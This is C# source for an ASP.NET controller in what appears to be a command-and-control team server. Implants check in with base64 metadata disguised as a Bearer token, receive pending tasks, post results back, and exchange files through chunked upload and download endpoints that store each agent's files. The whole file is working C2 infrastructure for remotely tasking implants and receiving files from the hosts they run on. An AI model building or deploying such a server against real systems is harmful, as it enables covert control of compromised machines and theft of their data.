using ApiModels.Response;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Models.File;
using TeamServer.Services;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private IAgentService _agentService;
        private IFileService _fileService;

        public HttpListenerController(IAgentService agentService, IFileService fileService)
        {
            this._agentService=agentService;
            this._fileService = fileService;
        }

        public async Task<IActionResult> HandleImplant()
        {
            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata == null)
                return NotFound();

            var agent = this._agentService.GetAgent(metadata.Id);
            if(agent == null)
            {
                agent = new Agent(metadata);
                this._agentService.AddAgent(agent);
            }

            agent.CheckIn();
            agent.Metadata.AvailableCommands = metadata.AvailableCommands;

            if(HttpContext.Request.Method == "POST")
            {
                string json;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                    json = await sr.ReadToEndAsync();

                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);

                agent.AddTaskResults(results);

            }


            var tasks = agent.GetPendingTaks();

            return Ok(tasks);
        }

        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
        {
            //Auhorization: Bearer <base64>
            if (!headers.TryGetValue("Authorization", out var encodedMetaDataHeader))
                return null;

            var encodedMetaData = encodedMetaDataHeader.ToString();

            if (!encodedMetaData.StartsWith("Bearer "))
                return null;

            encodedMetaData = encodedMetaData.Substring(7, encodedMetaData.Length - 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetaData));
            return JsonConvert.DeserializeObject<AgentMetadata>(json);
        }

        public IActionResult SetupDownload(string filename)
        {
            var decoded = System.Web.HttpUtility.UrlDecode(filename);
            string fullPath = this._fileService.GetFullPath(decoded);
            if (string.IsNullOrEmpty(fullPath))
                return NotFound();

            var desc = _fileService.CreateFileDescriptor(fullPath);
            if (desc == null)
                return NotFound();

            return Ok(new FileDescriptorResponse()
            {
                Id = desc.Id,
                Name = desc.Name,
                Length = desc.Length,
                ChunkCount = desc.ChunkCount,
                ChunkSize = desc.ChunkSize,
            });
        }

        public IActionResult DownloadChunk(string id, int index)
        {
            var desc = _fileService.GetFileToDownload(id);
            if (index < 0 || index >= desc.ChunkCount)
                return NotFound();

            var chunck = desc.Chunks[index];
            chunck.IsDownloaded = true;

            _fileService.CleanDownloaded();

            return Ok(new FileChunckResponse()
            {
                Data = chunck.Data,
                FileId = chunck.FileId,
                Index = chunck.Index,
            });
        }

        #region Upload
        public IActionResult SetupUpload([FromBody] FileDescriptor desc)
        {
            if (string.IsNullOrEmpty(desc.Id))
                return NotFound();

            _fileService.AddFileToUpload(desc);
            return Ok();
        }

        public IActionResult UploadChunk([FromBody] FileChunk chunk)
        {
            var desc = _fileService.GetFileToUpload(chunk.FileId);
            if (desc == null)
                return NotFound();

            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata == null)
                return NotFound();

            desc.Chunks.Add(chunk);
            if(desc.IsUploaded)
            {
                var fileName = _fileService.GetAgentPath(metadata.Id, desc.Name);
                _fileService.SaveUploadedFile(desc, fileName);
            }

            _fileService.CleanDownloaded();

            return Ok();
        }
        #endregion
    }
}
